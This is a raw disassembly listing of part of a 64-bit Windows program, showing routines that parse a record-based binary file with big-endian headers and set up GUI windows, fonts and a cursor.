   140001749:	48 8d 0d 14 a0 02 00 	lea    0x2a014(%rip),%rcx        # 0x14002b764
   140001750:	8b 10                	mov    (%rax),%edx
   140001752:	e8 b9 11 00 00       	call   0x140002910
   140001757:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   14000175c:	e9 ae 00 00 00       	jmp    0x14000180f
   140001761:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001766:	8b 77 0c             	mov    0xc(%rdi),%esi
   140001769:	48 85 f6             	test   %rsi,%rsi
   14000176c:	0f 84 90 00 00 00    	je     0x140001802
   140001772:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140001777:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000177e:	00 00 
   140001780:	49 3b f5             	cmp    %r13,%rsi
   140001783:	48 8b ee             	mov    %rsi,%rbp
   140001786:	4d 8b cf             	mov    %r15,%r9
   140001789:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000178f:	49 0f 47 ed          	cmova  %r13,%rbp
   140001793:	49 8b ce             	mov    %r14,%rcx
   140001796:	48 8b d5             	mov    %rbp,%rdx
   140001799:	e8 fe eb 00 00       	call   0x14001039c
   14000179e:	48 83 f8 01          	cmp    $0x1,%rax
   1400017a2:	72 36                	jb     0x1400017da
   1400017a4:	4d 8b cc             	mov    %r12,%r9
   1400017a7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400017ad:	48 8b d5             	mov    %rbp,%rdx
   1400017b0:	49 8b ce             	mov    %r14,%rcx
   1400017b3:	e8 24 f3 00 00       	call   0x140010adc
   1400017b8:	48 83 f8 01          	cmp    $0x1,%rax
   1400017bc:	72 07                	jb     0x1400017c5
   1400017be:	48 2b f5             	sub    %rbp,%rsi
   1400017c1:	75 bd                	jne    0x140001780
   1400017c3:	eb 38                	jmp    0x1400017fd
   1400017c5:	e8 3e 37 01 00       	call   0x140014f08
   1400017ca:	4c 8d 05 b7 a0 02 00 	lea    0x2a0b7(%rip),%r8        # 0x14002b888
   1400017d1:	48 8d 0d e4 a0 02 00 	lea    0x2a0e4(%rip),%rcx        # 0x14002b8bc
   1400017d8:	eb 13                	jmp    0x1400017ed
   1400017da:	e8 29 37 01 00       	call   0x140014f08
   1400017df:	4c 8d 05 62 a0 02 00 	lea    0x2a062(%rip),%r8        # 0x14002b848
   1400017e6:	48 8d 0d 8f a0 02 00 	lea    0x2a08f(%rip),%rcx        # 0x14002b87c
   1400017ed:	8b 10                	mov    (%rax),%edx
   1400017ef:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
   1400017f3:	e8 18 11 00 00       	call   0x140002910
   1400017f8:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400017fd:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140001802:	49 8b ce             	mov    %r14,%rcx
   140001805:	e8 26 37 01 00       	call   0x140014f30
   14000180a:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000180f:	4c 8b 6c 24 30       	mov    0x30(%rsp),%r13
   140001814:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   140001819:	49 8b cf             	mov    %r15,%rcx
   14000181c:	e8 2b e8 00 00       	call   0x14001004c
   140001821:	49 8b cc             	mov    %r12,%rcx
   140001824:	e8 23 e8 00 00       	call   0x14001004c
   140001829:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   14000182e:	8b c3                	mov    %ebx,%eax
   140001830:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140001835:	48 83 c4 38          	add    $0x38,%rsp
   140001839:	5f                   	pop    %rdi
   14000183a:	5b                   	pop    %rbx
   14000183b:	c3                   	ret
   14000183c:	cc                   	int3
   14000183d:	cc                   	int3
   14000183e:	cc                   	int3
   14000183f:	cc                   	int3
   140001840:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001845:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000184a:	57                   	push   %rdi
   14000184b:	48 83 ec 20          	sub    $0x20,%rsp
   14000184f:	48 8b 99 08 10 00 00 	mov    0x1008(%rcx),%rbx
   140001856:	48 8b f2             	mov    %rdx,%rsi
   140001859:	48 8b f9             	mov    %rcx,%rdi
   14000185c:	48 3b 99 10 10 00 00 	cmp    0x1010(%rcx),%rbx
   140001863:	73 70                	jae    0x1400018d5
   140001865:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000186c:	00 00 00 00 
   140001870:	44 0f b6 43 11       	movzbl 0x11(%rbx),%r8d
   140001875:	41 8d 40 a6          	lea    -0x5a(%r8),%eax
   140001879:	a8 f7                	test   $0xf7,%al
   14000187b:	74 3a                	je     0x1400018b7
   14000187d:	41 80 f8 64          	cmp    $0x64,%r8b
   140001881:	74 34                	je     0x1400018b7
   140001883:	41 80 f8 6e          	cmp    $0x6e,%r8b
   140001887:	74 2e                	je     0x1400018b7
   140001889:	41 80 f8 78          	cmp    $0x78,%r8b
   14000188d:	74 28                	je     0x1400018b7
   14000188f:	48 8d 43 12          	lea    0x12(%rbx),%rax
   140001893:	4c 8b c6             	mov    %rsi,%r8
   140001896:	4c 2b c0             	sub    %rax,%r8
   140001899:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400018a0:	0f b6 10             	movzbl (%rax),%edx
   1400018a3:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   1400018a8:	2b d1                	sub    %ecx,%edx
   1400018aa:	75 07                	jne    0x1400018b3
   1400018ac:	48 ff c0             	inc    %rax
   1400018af:	85 c9                	test   %ecx,%ecx
   1400018b1:	75 ed                	jne    0x1400018a0
   1400018b3:	85 d2                	test   %edx,%edx
   1400018b5:	eb 0e                	jmp    0x1400018c5
   1400018b7:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   1400018bb:	48 8b d6             	mov    %rsi,%rdx
   1400018be:	e8 61 37 01 00       	call   0x140015024
   1400018c3:	85 c0                	test   %eax,%eax
   1400018c5:	74 20                	je     0x1400018e7
   1400018c7:	8b 03                	mov    (%rbx),%eax
   1400018c9:	48 03 d8             	add    %rax,%rbx
   1400018cc:	48 3b 9f 10 10 00 00 	cmp    0x1010(%rdi),%rbx
   1400018d3:	72 9b                	jb     0x140001870
   1400018d5:	33 c0                	xor    %eax,%eax
   1400018d7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400018dc:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400018e1:	48 83 c4 20          	add    $0x20,%rsp
   1400018e5:	5f                   	pop    %rdi
   1400018e6:	c3                   	ret
   1400018e7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400018ec:	48 8b c3             	mov    %rbx,%rax
   1400018ef:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400018f4:	48 83 c4 20          	add    $0x20,%rsp
   1400018f8:	5f                   	pop    %rdi
   1400018f9:	c3                   	ret
   1400018fa:	cc                   	int3
   1400018fb:	cc                   	int3
   1400018fc:	cc                   	int3
   1400018fd:	cc                   	int3
   1400018fe:	cc                   	int3
   1400018ff:	cc                   	int3
   140001900:	40 53                	rex push %rbx
   140001902:	48 83 ec 20          	sub    $0x20,%rsp
   140001906:	48 8b 19             	mov    (%rcx),%rbx
   140001909:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
   140001910:	48 85 db             	test   %rbx,%rbx
   140001913:	74 19                	je     0x14000192e
   140001915:	48 8b 8b 08 10 00 00 	mov    0x1008(%rbx),%rcx
   14000191c:	e8 0f 36 01 00       	call   0x140014f30
   140001921:	48 8b cb             	mov    %rbx,%rcx
   140001924:	48 83 c4 20          	add    $0x20,%rsp
   140001928:	5b                   	pop    %rbx
   140001929:	e9 02 36 01 00       	jmp    0x140014f30
   14000192e:	48 83 c4 20          	add    $0x20,%rsp
   140001932:	5b                   	pop    %rbx
   140001933:	c3                   	ret
   140001934:	cc                   	int3
   140001935:	cc                   	int3
   140001936:	cc                   	int3
   140001937:	cc                   	int3
   140001938:	cc                   	int3
   140001939:	cc                   	int3
   14000193a:	cc                   	int3
   14000193b:	cc                   	int3
   14000193c:	cc                   	int3
   14000193d:	cc                   	int3
   14000193e:	cc                   	int3
   14000193f:	cc                   	int3
   140001940:	8b 02                	mov    (%rdx),%eax
   140001942:	48 03 c2             	add    %rdx,%rax
   140001945:	c3                   	ret
   140001946:	cc                   	int3
   140001947:	cc                   	int3
   140001948:	cc                   	int3
   140001949:	cc                   	int3
   14000194a:	cc                   	int3
   14000194b:	cc                   	int3
   14000194c:	cc                   	int3
   14000194d:	cc                   	int3
   14000194e:	cc                   	int3
   14000194f:	cc                   	int3
   140001950:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140001955:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000195a:	57                   	push   %rdi
   14000195b:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001962:	48 8b 05 d7 c6 03 00 	mov    0x3c6d7(%rip),%rax        # 0x14003e040
   140001969:	48 33 c4             	xor    %rsp,%rax
   14000196c:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   140001973:	00 
   140001974:	48 8d 15 49 9f 02 00 	lea    0x29f49(%rip),%rdx        # 0x14002b8c4
   14000197b:	48 8b e9             	mov    %rcx,%rbp
   14000197e:	33 db                	xor    %ebx,%ebx
   140001980:	e8 3b 2c 00 00       	call   0x1400045c0
   140001985:	48 8b f8             	mov    %rax,%rdi
   140001988:	48 85 c0             	test   %rax,%rax
   14000198b:	0f 84 bd 02 00 00    	je     0x140001c4e
   140001991:	48 8b 05 a0 bb 02 00 	mov    0x2bba0(%rip),%rax        # 0x14002d538
   140001998:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   14000199f:	00 
   1400019a0:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400019a7:	00 
   1400019a8:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400019ae:	48 c1 e8 18          	shr    $0x18,%rax
   1400019b2:	48 8b cf             	mov    %rdi,%rcx
   1400019b5:	04 0c                	add    $0xc,%al
   1400019b7:	48 89 b4 24 a8 00 00 	mov    %rsi,0xa8(%rsp)
   1400019be:	00 
   1400019bf:	88 84 24 83 00 00 00 	mov    %al,0x83(%rsp)
   1400019c6:	e8 c5 65 00 00       	call   0x140007f90
   1400019cb:	48 8b f0             	mov    %rax,%rsi
   1400019ce:	48 85 c0             	test   %rax,%rax
   1400019d1:	0f 84 64 02 00 00    	je     0x140001c3b
   1400019d7:	45 33 c0             	xor    %r8d,%r8d
   1400019da:	48 8b d0             	mov    %rax,%rdx
   1400019dd:	48 8b cf             	mov    %rdi,%rcx
   1400019e0:	e8 ef ec 00 00       	call   0x1400106d4
   1400019e5:	85 c0                	test   %eax,%eax
   1400019e7:	79 1f                	jns    0x140001a08
   1400019e9:	e8 1a 35 01 00       	call   0x140014f08
   1400019ee:	4c 8d 05 0b a0 02 00 	lea    0x2a00b(%rip),%r8        # 0x14002ba00
   1400019f5:	48 8d 0d 40 9f 02 00 	lea    0x29f40(%rip),%rcx        # 0x14002b93c
   1400019fc:	8b 10                	mov    (%rax),%edx
   1400019fe:	e8 0d 0f 00 00       	call   0x140002910
   140001a03:	e9 33 02 00 00       	jmp    0x140001c3b
   140001a08:	4c 8b cf             	mov    %rdi,%r9
   140001a0b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001a10:	ba 58 00 00 00       	mov    $0x58,%edx
   140001a15:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001a1b:	e8 7c e9 00 00       	call   0x14001039c
   140001a20:	48 83 f8 01          	cmp    $0x1,%rax
   140001a24:	73 1f                	jae    0x140001a45
   140001a26:	e8 dd 34 01 00       	call   0x140014f08
   140001a2b:	4c 8d 05 f6 9f 02 00 	lea    0x29ff6(%rip),%r8        # 0x14002ba28
   140001a32:	48 8d 0d 43 9e 02 00 	lea    0x29e43(%rip),%rcx        # 0x14002b87c
   140001a39:	8b 10                	mov    (%rax),%edx
   140001a3b:	e8 d0 0e 00 00       	call   0x140002910
   140001a40:	e9 f6 01 00 00       	jmp    0x140001c3b
   140001a45:	ba 70 10 00 00       	mov    $0x1070,%edx
   140001a4a:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001a4f:	e8 d4 34 01 00       	call   0x140014f28
   140001a54:	48 8b d8             	mov    %rax,%rbx
   140001a57:	48 85 c0             	test   %rax,%rax
   140001a5a:	75 1f                	jne    0x140001a7b
   140001a5c:	e8 a7 34 01 00       	call   0x140014f08
   140001a61:	4c 8d 05 d8 9f 02 00 	lea    0x29fd8(%rip),%r8        # 0x14002ba40
   140001a68:	48 8d 0d 05 a0 02 00 	lea    0x2a005(%rip),%rcx        # 0x14002ba74
   140001a6f:	8b 10                	mov    (%rax),%edx
   140001a71:	e8 9a 0e 00 00       	call   0x140002910
   140001a76:	e9 c0 01 00 00       	jmp    0x140001c3b
   140001a7b:	4c 8b cd             	mov    %rbp,%r9
   140001a7e:	4c 8d 05 f7 9f 02 00 	lea    0x29ff7(%rip),%r8        # 0x14002ba7c
   140001a85:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001a8a:	48 8b cb             	mov    %rbx,%rcx
   140001a8d:	e8 ee 01 00 00       	call   0x140001c80
   140001a92:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140001a96:	48 8d 8b 2c 10 00 00 	lea    0x102c(%rbx),%rcx
   140001a9d:	0f c8                	bswap  %eax
   140001a9f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001aa3:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   140001aa8:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   140001aac:	4c 8d 05 c9 9f 02 00 	lea    0x29fc9(%rip),%r8        # 0x14002ba7c
   140001ab3:	0f c8                	bswap  %eax
   140001ab5:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140001ab9:	ba 40 00 00 00       	mov    $0x40,%edx
   140001abe:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140001ac2:	0f c8                	bswap  %eax
   140001ac4:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140001ac8:	8b 44 24 34          	mov    0x34(%rsp),%eax
   140001acc:	0f c8                	bswap  %eax
   140001ace:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140001ad2:	89 83 28 10 00 00    	mov    %eax,0x1028(%rbx)
   140001ad8:	e8 a3 01 00 00       	call   0x140001c80
   140001add:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140001ae1:	45 33 c0             	xor    %r8d,%r8d
   140001ae4:	48 2b f0             	sub    %rax,%rsi
   140001ae7:	48 8b cf             	mov    %rdi,%rcx
   140001aea:	48 8d 46 58          	lea    0x58(%rsi),%rax
   140001aee:	48 89 83 00 10 00 00 	mov    %rax,0x1000(%rbx)
   140001af5:	8b 54 24 2c          	mov    0x2c(%rsp),%edx
   140001af9:	48 03 d0             	add    %rax,%rdx
   140001afc:	e8 d3 eb 00 00       	call   0x1400106d4
   140001b01:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140001b05:	e8 3a 34 01 00       	call   0x140014f44
   140001b0a:	48 89 83 08 10 00 00 	mov    %rax,0x1008(%rbx)
   140001b11:	48 85 c0             	test   %rax,%rax
   140001b14:	75 1f                	jne    0x140001b35
   140001b16:	e8 ed 33 01 00       	call   0x140014f08
   140001b1b:	4c 8d 05 5e 9f 02 00 	lea    0x29f5e(%rip),%r8        # 0x14002ba80
   140001b22:	48 8d 0d 3b 9c 02 00 	lea    0x29c3b(%rip),%rcx        # 0x14002b764
   140001b29:	8b 10                	mov    (%rax),%edx
   140001b2b:	e8 e0 0d 00 00       	call   0x140002910
   140001b30:	e9 06 01 00 00       	jmp    0x140001c3b
   140001b35:	8b 54 24 30          	mov    0x30(%rsp),%edx
   140001b39:	4c 8b cf             	mov    %rdi,%r9
   140001b3c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001b42:	48 8b c8             	mov    %rax,%rcx
   140001b45:	e8 52 e8 00 00       	call   0x14001039c
   140001b4a:	48 83 f8 01          	cmp    $0x1,%rax
   140001b4e:	73 1f                	jae    0x140001b6f
   140001b50:	e8 b3 33 01 00       	call   0x140014f08
   140001b55:	4c 8d 05 4c 9f 02 00 	lea    0x29f4c(%rip),%r8        # 0x14002baa8
   140001b5c:	48 8d 0d 19 9d 02 00 	lea    0x29d19(%rip),%rcx        # 0x14002b87c
   140001b63:	8b 10                	mov    (%rax),%edx
   140001b65:	e8 a6 0d 00 00       	call   0x140002910
   140001b6a:	e9 cc 00 00 00       	jmp    0x140001c3b
   140001b6f:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140001b73:	48 8b cf             	mov    %rdi,%rcx
   140001b76:	48 03 83 08 10 00 00 	add    0x1008(%rbx),%rax
   140001b7d:	48 89 83 10 10 00 00 	mov    %rax,0x1010(%rbx)
   140001b84:	e8 87 e5 00 00       	call   0x140010110
   140001b89:	85 c0                	test   %eax,%eax
   140001b8b:	74 11                	je     0x140001b9e
   140001b8d:	48 8d 0d 34 9f 02 00 	lea    0x29f34(%rip),%rcx        # 0x14002bac8
   140001b94:	e8 77 0b 00 00       	call   0x140002710
   140001b99:	e9 9d 00 00 00       	jmp    0x140001c3b
   140001b9e:	48 8b 93 08 10 00 00 	mov    0x1008(%rbx),%rdx
   140001ba5:	48 3b 93 10 10 00 00 	cmp    0x1010(%rbx),%rdx
   140001bac:	0f 83 89 00 00 00    	jae    0x140001c3b
   140001bb2:	44 8b 05 5f c4 03 00 	mov    0x3c45f(%rip),%r8d        # 0x14003e018
   140001bb9:	66 0f 6f 0d 1f 9f 02 	movdqa 0x29f1f(%rip),%xmm1        # 0x14002bae0
   140001bc0:	00 
   140001bc1:	33 c0                	xor    %eax,%eax
   140001bc3:	41 83 f8 02          	cmp    $0x2,%r8d
   140001bc7:	7c 17                	jl     0x140001be0
   140001bc9:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140001bcd:	66 0f 38 00 c1       	pshufb %xmm1,%xmm0
   140001bd2:	f3 0f 7f 02          	movdqu %xmm0,(%rdx)
   140001bd6:	eb 19                	jmp    0x140001bf1
   140001bd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001bdf:	00 
   140001be0:	8b 0c 82             	mov    (%rdx,%rax,4),%ecx
   140001be3:	0f c9                	bswap  %ecx
   140001be5:	89 0c 82             	mov    %ecx,(%rdx,%rax,4)
   140001be8:	48 ff c0             	inc    %rax
   140001beb:	48 83 f8 04          	cmp    $0x4,%rax
   140001bef:	7c ef                	jl     0x140001be0
   140001bf1:	0f b6 4a 11          	movzbl 0x11(%rdx),%ecx
   140001bf5:	8d 41 a6             	lea    -0x5a(%rcx),%eax
   140001bf8:	a8 f7                	test   $0xf7,%al
   140001bfa:	74 13                	je     0x140001c0f
   140001bfc:	80 f9 64             	cmp    $0x64,%cl
   140001bff:	74 0e                	je     0x140001c0f
   140001c01:	80 f9 6e             	cmp    $0x6e,%cl
   140001c04:	74 09                	je     0x140001c0f
   140001c06:	80 f9 78             	cmp    $0x78,%cl
   140001c09:	74 04                	je     0x140001c0f
   140001c0b:	32 c0                	xor    %al,%al
   140001c0d:	eb 02                	jmp    0x140001c11
   140001c0f:	b0 01                	mov    $0x1,%al
   140001c11:	0a 83 18 10 00 00    	or     0x1018(%rbx),%al
   140001c17:	0f 95 c0             	setne  %al
   140001c1a:	88 83 18 10 00 00    	mov    %al,0x1018(%rbx)
   140001c20:	80 7a 11 6c          	cmpb   $0x6c,0x11(%rdx)
   140001c24:	75 07                	jne    0x140001c2d
   140001c26:	48 89 93 20 10 00 00 	mov    %rdx,0x1020(%rbx)
   140001c2d:	8b 02                	mov    (%rdx),%eax
   140001c2f:	48 03 d0             	add    %rax,%rdx
   140001c32:	48 3b 93 10 10 00 00 	cmp    0x1010(%rbx),%rdx
   140001c39:	72 86                	jb     0x140001bc1
   140001c3b:	48 8b cf             	mov    %rdi,%rcx
   140001c3e:	e8 09 e4 00 00       	call   0x14001004c
   140001c43:	48 8b b4 24 a8 00 00 	mov    0xa8(%rsp),%rsi
   140001c4a:	00 
   140001c4b:	48 8b c3             	mov    %rbx,%rax
   140001c4e:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   140001c55:	00 
   140001c56:	48 33 cc             	xor    %rsp,%rcx
   140001c59:	e8 f2 a8 00 00       	call   0x14000c550
   140001c5e:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140001c65:	00 
   140001c66:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140001c6a:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   140001c6e:	49 8b e3             	mov    %r11,%rsp
   140001c71:	5f                   	pop    %rdi
   140001c72:	c3                   	ret
   140001c73:	cc                   	int3
   140001c74:	cc                   	int3
   140001c75:	cc                   	int3
   140001c76:	cc                   	int3
   140001c77:	cc                   	int3
   140001c78:	cc                   	int3
   140001c79:	cc                   	int3
   140001c7a:	cc                   	int3
   140001c7b:	cc                   	int3
   140001c7c:	cc                   	int3
   140001c7d:	cc                   	int3
   140001c7e:	cc                   	int3
   140001c7f:	cc                   	int3
   140001c80:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001c85:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001c8a:	53                   	push   %rbx
   140001c8b:	55                   	push   %rbp
   140001c8c:	56                   	push   %rsi
   140001c8d:	57                   	push   %rdi
   140001c8e:	48 83 ec 38          	sub    $0x38,%rsp
   140001c92:	49 8b f0             	mov    %r8,%rsi
   140001c95:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   140001c9a:	48 8b da             	mov    %rdx,%rbx
   140001c9d:	48 8b f9             	mov    %rcx,%rdi
   140001ca0:	e8 9b f3 ff ff       	call   0x140001040
   140001ca5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140001caa:	4c 8b ce             	mov    %rsi,%r9
   140001cad:	4c 8b c3             	mov    %rbx,%r8
   140001cb0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001cb7:	00 00 
   140001cb9:	48 8b d7             	mov    %rdi,%rdx
   140001cbc:	48 8b 08             	mov    (%rax),%rcx
   140001cbf:	48 83 c9 02          	or     $0x2,%rcx
   140001cc3:	e8 bc 2c 01 00       	call   0x140014984
   140001cc8:	85 c0                	test   %eax,%eax
   140001cca:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140001ccf:	0f 48 c1             	cmovs  %ecx,%eax
   140001cd2:	48 83 c4 38          	add    $0x38,%rsp
   140001cd6:	5f                   	pop    %rdi
   140001cd7:	5e                   	pop    %rsi
   140001cd8:	5d                   	pop    %rbp
   140001cd9:	5b                   	pop    %rbx
   140001cda:	c3                   	ret
   140001cdb:	cc                   	int3
   140001cdc:	cc                   	int3
   140001cdd:	cc                   	int3
   140001cde:	cc                   	int3
   140001cdf:	cc                   	int3
   140001ce0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001ce5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140001cea:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001cef:	57                   	push   %rdi
   140001cf0:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   140001cf7:	48 8b 05 42 c3 03 00 	mov    0x3c342(%rip),%rax        # 0x14003e040
   140001cfe:	48 33 c4             	xor    %rsp,%rax
   140001d01:	48 89 84 24 70 02 00 	mov    %rax,0x270(%rsp)
   140001d08:	00 
   140001d09:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140001d0d:	4c 8d 05 dc 9d 02 00 	lea    0x29ddc(%rip),%r8        # 0x14002baf0
   140001d14:	4c 8b 49 10          	mov    0x10(%rcx),%r9
   140001d18:	48 8b f9             	mov    %rcx,%rdi
   140001d1b:	48 83 c1 28          	add    $0x28,%rcx
   140001d1f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001d24:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001d29:	e8 92 08 00 00       	call   0x1400025c0
   140001d2e:	ff 15 3c 97 02 00    	call   *0x2973c(%rip)        # 0x14002b470
   140001d34:	0f b7 c8             	movzwl %ax,%ecx
   140001d37:	ba 32 00 00 00       	mov    $0x32,%edx
   140001d3c:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001d42:	8b d8                	mov    %eax,%ebx
   140001d44:	ff 15 76 93 02 00    	call   *0x29376(%rip)        # 0x14002b0c0
   140001d4a:	48 c1 eb 10          	shr    $0x10,%rbx
   140001d4e:	ba 0e 00 00 00       	mov    $0xe,%edx
   140001d53:	0f b7 cb             	movzwl %bx,%ecx
   140001d56:	bb 08 00 00 00       	mov    $0x8,%ebx
   140001d5b:	44 8b c3             	mov    %ebx,%r8d
   140001d5e:	66 89 87 5a 20 00 00 	mov    %ax,0x205a(%rdi)
   140001d65:	ff 15 55 93 02 00    	call   *0x29355(%rip)        # 0x14002b0c0
   140001d6b:	33 d2                	xor    %edx,%edx
   140001d6d:	c7 87 5e 20 00 00 20 	movl   $0x200020,0x205e(%rdi)
   140001d74:	00 20 00 
   140001d77:	41 b8 f4 01 00 00    	mov    $0x1f4,%r8d
   140001d7d:	66 89 87 5c 20 00 00 	mov    %ax,0x205c(%rdi)
   140001d84:	48 8d 4c 24 74       	lea    0x74(%rsp),%rcx
   140001d89:	66 89 9f 58 20 00 00 	mov    %bx,0x2058(%rdi)
   140001d90:	e8 3b 87 02 00       	call   0x14002a4d0
   140001d95:	45 33 c9             	xor    %r9d,%r9d
   140001d98:	c7 44 24 70 f8 01 00 	movl   $0x1f8,0x70(%rsp)
   140001d9f:	00 
   140001da0:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140001da5:	ba f8 01 00 00       	mov    $0x1f8,%edx
   140001daa:	b9 29 00 00 00       	mov    $0x29,%ecx
   140001daf:	ff 15 73 96 02 00    	call   *0x29673(%rip)        # 0x14002b428
   140001db5:	33 ed                	xor    %ebp,%ebp
   140001db7:	85 c0                	test   %eax,%eax
   140001db9:	74 10                	je     0x140001dcb
   140001dbb:	48 8d 8c 24 08 02 00 	lea    0x208(%rsp),%rcx
   140001dc2:	00 
   140001dc3:	ff 15 7f 92 02 00    	call   *0x2927f(%rip)        # 0x14002b048
   140001dc9:	eb 03                	jmp    0x140001dce
   140001dcb:	48 8b c5             	mov    %rbp,%rax
   140001dce:	4c 8d 8f 50 20 00 00 	lea    0x2050(%rdi),%r9
   140001dd5:	48 89 87 48 20 00 00 	mov    %rax,0x2048(%rdi)
   140001ddc:	ba 01 7f 00 00       	mov    $0x7f01,%edx
   140001de1:	33 c9                	xor    %ecx,%ecx
   140001de3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001de9:	ff 15 39 92 02 00    	call   *0x29239(%rip)        # 0x14002b028
   140001def:	48 8b 07             	mov    (%rdi),%rax
   140001df2:	48 8d 15 77 9d 02 00 	lea    0x29d77(%rip),%rdx        # 0x14002bb70
   140001df9:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001dfe:	41 b9 03 00 00 50    	mov    $0x50000003,%r9d
   140001e04:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001e09:	45 33 c0             	xor    %r8d,%r8d
   140001e0c:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001e10:	33 c9                	xor    %ecx,%ecx
   140001e12:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001e17:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001e1c:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001e23:	80 
   140001e24:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001e2b:	80 
   140001e2c:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001e33:	80 
   140001e34:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001e3b:	80 
   140001e3c:	ff 15 76 95 02 00    	call   *0x29576(%rip)        # 0x14002b3b8
   140001e42:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001e47:	48 8d 15 22 9d 02 00 	lea    0x29d22(%rip),%rdx        # 0x14002bb70
   140001e4e:	48 89 87 28 20 00 00 	mov    %rax,0x2028(%rdi)
   140001e55:	41 b9 00 00 00 50    	mov    $0x50000000,%r9d
   140001e5b:	48 8b 07             	mov    (%rdi),%rax
   140001e5e:	45 33 c0             	xor    %r8d,%r8d
   140001e61:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001e66:	33 c9                	xor    %ecx,%ecx
   140001e68:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001e6c:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001e71:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001e76:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001e7d:	80 
   140001e7e:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001e85:	80 
   140001e86:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001e8d:	80 
   140001e8e:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001e95:	80 
   140001e96:	ff 15 1c 95 02 00    	call   *0x2951c(%rip)        # 0x14002b3b8
   140001e9c:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001ea1:	48 8d 15 d8 9c 02 00 	lea    0x29cd8(%rip),%rdx        # 0x14002bb80
   140001ea8:	48 89 87 30 20 00 00 	mov    %rax,0x2030(%rdi)
